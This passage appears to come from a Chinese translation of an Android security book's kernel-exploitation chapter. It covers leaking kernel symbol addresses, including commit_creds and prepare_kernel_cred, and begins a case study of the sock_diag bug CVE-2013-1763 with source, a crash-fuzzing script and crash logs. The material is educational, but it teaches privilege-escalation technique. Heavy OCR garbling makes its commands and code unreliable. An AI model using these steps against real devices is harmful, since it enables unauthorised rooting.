10.5内核漏洞利用273
量运用了函数指针和间接内存访问。这些方式提高了内存破坏漏洞变成任意代码执行的可能性。
综上所述，Android上Linux内核的漏洞利用比用户空间的利用更加简单。简而言之，Android
上的Linux内核比其他现代目标要容易攻击得多。
10.5.2获取地址
如前所述，内核编译工具向内核镜像中嵌入了一些有关安全的信息，需要特别注意的是符号
表。在内核中有许多全局数据和函数，每个都用一个符号名来表示。这些名字和相应的地址信息
都通过proc文件系统下的kallsyms暴露给用户空间。内核镜像的加载方式使得所有全局符号都
使用不变的静态地址（即使系统重启）。从攻击者的角度来看，这是一个很大的优势，因为它提
供了一张内核地址空间的图谱。了解内存中关键的函数和数据结构，极大地方便了利用程序开发。
CONFIG_KALLSYMS配置选项决定了内核符号表是否包含在二进制镜像中。幸运的是，几乎
所有Android设备（除了一些TV设备）都开启了这个选项。事实上，禁用这个选项会极大增加
内核调试的难度。在果冻豆之前，通过读取/proc/kallsyms文件，可以获取几乎所有的内核符号名
称和地址。果冻豆及之后的版本都会防止使用该方法，不过好在还有其他方法。
在Android系统中，设备制造商把Linux内核装人每个设备的固件中，升级内核就需要OTA
升级或者刷人一个新的系统镜像。因为每个设备只有一个二进制内核镜像，所以可以用以下两种
方法中的一种来实现。第一，可以先获取二进制镜像，然后通过静态方法得到大多数内核符号。
第二，可以使用信息泄露漏洞（如CVE-2013-6282）直接从内核内存中读取符号表信息。这两种
方法都绕过了防止直接读取/proc/kallsyms的保护限制。获得的地址可以用于本地攻击，也可以用
于远程攻击，因为它们都是硬编码的。
“android-rooting-tools”项目中的kallsymprint工具可以从静态文件中抽取符号表。编译
这个工具需要Github中两个不同项目的源代码：主项目与其GIT子模块。编译这个工具并针对
Nexus5原厂镜像运行的步骤如下：
dev:~/android/n5/hammerhead-krt16m/img/boot $ git clone \
https://github,com/f101/ka11aymsprint git
Cloning into kallsymsprint'...
dev:~/android/n5/hanmerheadkrt16m/img/boot $ ed ka11aymprInt
[- . - ]
10
dev:~/android/n5/hanmerhead-krt16m/img/boot/ka11symprint $ git submodule init
(https: //github.com/androidrooting-too18/1ibka11syms git)
dev:~/andro1id/n5/hammerheadkrt16m/ing/boot/ka11symprint $ git subeodule 
update
Submodule path 1ibka11syms′: checked out
[ - . -]
ffe994e0b161t42a46d9cb3703dac844f5425ba4
检出的仓库包含一个二进制镜像，但是一般不建议直接运行不可信的二进制文件。理解了源
代码，就可以使用下面的命令进行编译：
---
## Page 290
274第10章攻击内核
dev:~/andro1d/n5/hammerheadkrt16m/img/boot/ka11symprint $ rm ka11symprint
dev:~/android/n5/hammerhead-krt16m/img/boot/ka11symprint $ gcc -m32 -I. \
-o ka11symsprint main c 1ibka11ayms/ka11ayms_in_memory -c
[·.*]
从源代码重新编译二进制镜像后，从解压的Nexus5内核中提取符号，如下所示：
dev:~/android/n5/hammerheadkrt16m/ Lmg/boot/ka11symprint $ cd,
dev:~/android/n5/hammerheadkrt16m/img/boot $ /ka11aymsprint/ka11symsprint 
piggy 2> /dev/nu11 1 grep -E *(prepare_kernel_cred|commit_cre@s)*
e01bae14 commit_creds
c01bb404 prepare_kernel_cred
这两个符号在很多内核权限提升的利用程序中都会用到，包括下一节的案例分析。
10.5.3案例分析
深入分析利用程序开发过程，可以很好地理解内核漏洞利用中的一些概念。本节提供了3个
案例，用来介绍Android设备中的漏润是如何被利用的。首先简要介绍一系列有趣的Linux内核
漏洞，除了Android设备，它们还影响了大量其他设备。然后深人理解利用程序，将在一些特定
环境下开发和运行的内存破坏漏洞利用代码，移植到同样受到影响的Android设备上。
1. sock_diag
sock_diag漏洞是介绍Android设备Linux内核漏润利用的绝佳案例。这个bug是在Linux内
核3.3版本的开发过程中引入的。虽然目前没有Android设备采用3.3版本的内核，但是有一些
使用了3.4版本的内核，包括搭载Android4.3及之前版本系统的Nexus4，以及一些其他厂商的
设备，例如HTCOne。通过这个漏洞，这些受影响的设备无需清空用户数据就能被roo4。另外，
攻击者可以在远程攻击浏览器之后利用这个漏洞来提权，从面取得手机的完全控制权。这个漏洞
被赋予编号CVE-2013-1763，描述如下：
在 Linux 内核 3.7.10版本之前，net/core/sock_diag.c 中的__sock_diag_rcv_msg
函数存在数组下标错误，本地用户可以通过构造一个具有较大family值的Netlink消
息进行提权
正如 CVE（Common Vulnerabilities andExposures）的描述所示，内核在处理Netlink消息
时会调用存在漏洞的函数。具体来说，到达这个函数有两个关键条件。首先，消息必须使用
NETLINK_SOCK_DIAG协议的Netlink套接字来发送。其次，这个消息必须指定一个SOCK_DIAG_
BY_FAMILY的nlmsg_type字段。一些x86和x86_64下的公开漏洞利用实现了这些细节。
CVE的描述还指出，漏润存在于Linux内核源代码net/core/sock_diag.c 的sock_diag.
rcv_msg函数中。可以看到，这在严格意义上并不准确。相应函数的源代码如下：
120 statie int _sock_diag_rcv_msg(struct sk_buff *skb, struct nlnsghdr
121(
*n1h)
122
int err;
---
## Page 291
10.5内核漏润利用
275
123
struct sock_diag_req *req = NLMSG_DATA(nlh);
124
struct sock_diag_handler *hnd1:
126
SET
if (nlmsg_len(nlh) sdiag_family) :
当函数被调用时，nlh参数来自于非特权用户发送的消息，消息中的数据就是Netlink消息的
载荷。第 129行 sock_diag_reg结构体中的 sdiag_family 被传递到了sock_diag_lock_
handler函数，该函数的代码如下：
105 static inline struct sock_diag_handler *sock_diag_lock_handler(int
family)
106 {
107
1f (sock_diag_handlers [family] == NULL)
108
109
request_module (*net-pfsd-proto-&d-type-id*, PF_NErLINK,
110
NETLINK_SOCK_DIAG, fami1y) :
111
mutex_1ock (&sock_diag_table_mutex) :
112
113 )
return sock_diag_handlers [family]:
在这个函数中，family参数来自于发送消息的用户。在第107行，这个参数被用作数组的
下标，来检查相应sock_diag_handlers数组的元素是否为空。这里并没有检查这个下标是否
在数组的边界范围内。在第112行，数组中的元素被返回到调用函数中，但是其重要性现在还不
明显。下面回到调用函数，跟踪返回结果是如何被处理的。
 continued fzroe _sock_diag_rcv_msg in net/core/sock_diag.c
129
hnd1 = sock_dlag_1ock_handlez (reg->sdiag_fami1ly) :
130
131
1f (hnd1 *= NULL)
132
err = -EN08NT:
133
else
exr = hnd1>dump (skb, nlh) :
第129行为调用点。返回结果被保存在hnd1变量中，在第130行再次进行是否为空的检查
后，内核将这个变量作为函数指针来调用。相信有漏洞研究经验的读者已经看到了这个漏洞的潜
在利用价值。
10
因此，可以让内核从数组边界之外取得这个变量，但是现在还不能直接控制hnd1变量。为
了控制它，需要让它指向可以控制的区城。如果不知道数组边界以外的内存是什么，就无法确定
该传入什么family值。为了弄清楚这个问题，我们构造一个概念验证程序（proof-of-concept），
接收一个命令行参数来作为family变量的值，并计划尝试一系列的值作为index。如果内核发
生崩溃，设备会重启。/proc/last_kmsg模块使我们能够看到前溃点的上下文和内核空间内存中的
相应值。下面的代码片段展示了自动化这一过程所用到的脚本和命令行：
dev:~/android/sock_diag $ cat getem.sh
CMD=*adb waitfordevice she11 /data/1ocal/tap/sock_diag*
1/bin/bash
IS aos 9s g- bugua 0- owga/uya/xsn/
---
## Page 292
276
第10章攻击内核
TIKg=^cat timing | cut -d. -f1'
If [$TIME -gt 1 1;then
let TIME=S(( STIME + 0 1)
adb wait-for-Gevice pu11 /proe/last_kmsg kmsg.$1
euop ITT$ qe*weqe5/* op :8tt T bes, uT TT xog s 6eTpxoos/ptoapue/-:aap
f
[..-]
shell脚本会根据adbshel1命令执行时间长短来判断设备是否崩溃。如果发生崩溃，设备
会重启，期间ADB会话暂时断开。如果没有发生前溃，ADB会迅速返回。检测到前溃时，脚本
会将/proc/last_kmsg保存到带有数组下标的文件名当中。命令执行后，结果如下：
dev:/android/sock_diag $ grep Unable to handle kernel paging request* knsg.* \
0 -n
kmsg,48: Unable to handle kernel paging request at virtual address 00001004
[. .-]
kmsg.51: Unable to handle kernel paging request at virtual address 00007604
[. . -]
kmsg.111: Unable to handle kermel paging request at virtual address 31000034
[. . -】
kmsg.112: Unable to handle kernel paging request at virtual address 00320004
kmsg.113: Unable to handle kernel paging request at virtual address 00003304
kmsg.114: Unable to handle kernel paging request at virtual address
kmsg.115: Unable to handle kernel paging request at virtual address 00360004
35000038
kmsg.116: Unable to handle kernel paging request at virtual address 00003704
[·**】
可以看到，一些下标值能让内核在尝试读取用户空间数据时发生崩溃。不幸的是，由于内核
开启了mmap_min_addr保护机制，不能利用用户空间开头的一些地址；但是后面的一些地址是
可用的，可以在程序中映射这些地址，从面控制hnd1的内容。问题是，应该使用什么地址？这
些地址是否稳定？
10.4.2节介绍了1ast_kmsg 中的Oops 消息，并指出使用 decodecode脚本特别有用。下面的
输出展示了这个脚本如何从崩溃信息中获得有用的细节信息。
dev:~/android/src/kernel/msm S export CROSs_coMPILB=arm-eabi-
dev:~/android/src/kernel/msn S ./scripts/decodecode < oops.txt
[174.378177] Code: e5963008 e3530000 03e04001 0a000004 (e5933004)
A11 code
0:
e5963008
1dr
r3,[x6,#8]
4 1
00000599
cmp
r3,#0
8 :
03e04001
mvneq
r4,#1
C:
0a000004
beq
0x24
10 : *